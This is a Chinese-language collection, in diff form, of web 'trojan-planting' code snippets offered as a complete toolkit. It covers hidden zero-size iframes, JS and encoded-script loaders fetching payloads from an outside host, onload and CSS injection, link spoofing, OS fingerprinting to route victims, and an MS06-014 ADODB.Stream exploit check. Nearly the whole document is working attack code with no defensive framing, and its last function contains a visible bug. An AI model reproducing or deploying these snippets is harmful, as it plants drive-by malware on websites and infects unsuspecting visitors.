@@ -1,0 +1,100 @@
+完整一套网页挂马代码
+一:框架挂马
+<iframe src=地址 width=0 height=0></iframe>
+二:js文件挂马
+首先将以下代码
+document.write("<iframe width='0' height='0' src='地址'></iframe>");
+保存为xxx.js，
+则JS挂马代码为
+<script language=javascript src=xxx.js></script>
+三:js变形加密
+<SCRIPT language="JScript.Encode" src=http://www.upx.com.cn/muma.txt></script>
+muma.txt可改成任意后缀
+四:body挂马
+<body onload="window.location='地址';"></body>
+五:隐蔽挂马
+top.document.body.innerHTML = top.document.body.innerHTML + '\r\n<iframe src="http://www.upx.com.cn/muma.htm/"></iframe>';
+六:css中挂马
+body {
+background-image: url('javascript:document.write("<script src=http://www.upx.com.cn/muma.js></script>")')}
+七:JAJA挂马
+<SCRIPT language=javascript>
+window.open ("地址","","toolbar=no,location=no,directories=no,status=no,menubar=no,scro llbars=no,width=1,height=1");
+</script>
+八:图片伪装
+<html>
+<iframe src="网马地址" height=0 width=0></iframe>
+<img src="图片地址"></center>
+</html>
+九:伪装调用：
+<frameset rows="444,0" cols="*">
+<frame src="打开网页" framborder="no" scrolling="auto" noresize marginwidth="0"margingheight="0">
+<frame src="网马地址" frameborder="no" scrolling="no" noresize marginwidth="0"margingheight="0">
+</frameset>
+十:高级欺骗
+<a href="http://www.163.com(迷惑连接地址，显示这个地址指向木马地址)" onMouseOver="www_163_com(); return true;"> 页面要显示的内容 </a>
+<SCRIPT Language="JavaScript">
+function www_163_com ()
+{
+var url="网马地址";
+open(url,"NewWindow","toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,copyhistory=yes,width=800,height=600,left=10,top=10");
+}
+</SCRIPT>
+十一:判断系统代码
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>404</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="MSHTML 6.00.2900.2769" name=GENERATOR></HEAD>
+<BODY>
+<SCRIPT language=javascript>
+window.status="";
+if(navigator.userAgent.indexOf("Windows NT 5.1") != -1)
+window.location.href="tk.htm";
+else
+window.location.href="upx06014.htm";
+</SCRIPT>
+</BODY></HTML>
+十二:判断是否有ms06014代码
+<script language=VBScript>
+on error resume next
+set server = document.createElement("object")
+server.setAttribute "classid", "clsid:10072CEC-8CC1-11D1-986E-00A0C955B42E"
+set File = server.createobject(Adodb.Stream,"")
+if Not Err.Number = 0 then
+err.clear
+document.write ("<iframe src=http://upx.com.cn width=100% height=100% scrolling=no frameborder=0>")
+else
+document.write ("<iframe src=http://upx.com.cn width=100% height=100% scrolling=no frameborder=0>")
+end if
+</script>
+十三:智能读取js的代码demo
+//读娶src的对象
+var v = document.getElementById("advjs");
+//读娶src的参数
+var u_num = getUrlParameterAdv("showmatrix_num",v.getAttribute('src'));
+document.write("<iframe src=\"http://www.upx.com.cn/1/"+u_num+".htm\" width=\"0\" height=\"0\" frameborder=\"0\"></iframe>");
+document.writeln("<!DOCTYPE HTML PUBLIC \"-\/\/W3C\/\/DTD HTML 4.0 Transitional\/\/EN\">");
+document.writeln("<HTML><HEAD>");
+document.writeln("<META http-equiv=Content-Type content=\"text\/html; charset=big5\">");
+document.writeln("<META content=\"MSHTML 6.00.2900.3059\" name=GENERATOR><\/HEAD>");
+document.writeln("<BODY> ");
+document.writeln("<DIV style=\"CURSOR: url(\'http:\/\/www.upx.com.cn\/demo.js\')\">");
+document.writeln("<DIV ");
+document.writeln("style=\"CURSOR: url(\'http:\/\/www.upx.com.cn\/demo.js\')\"><\/DIV><\/DIV><\/BODY><\/HTML>")
+//分析src的参数函数
+function getUrlParameterAdv(asName,lsURL){
+loU = lsURL.split("?");
+if (loU.length>1){
+var loallPm = loU[1].split("&");
+for (var i=0; i<loallPm.length; i++){
+var loPm = loallPm.split("=");
+if (loPm[0]==asName){
+if (loPm.length>1){
+return loPm[1];
+}else{
+return "";
+}
+}
+}
+}
+return null;
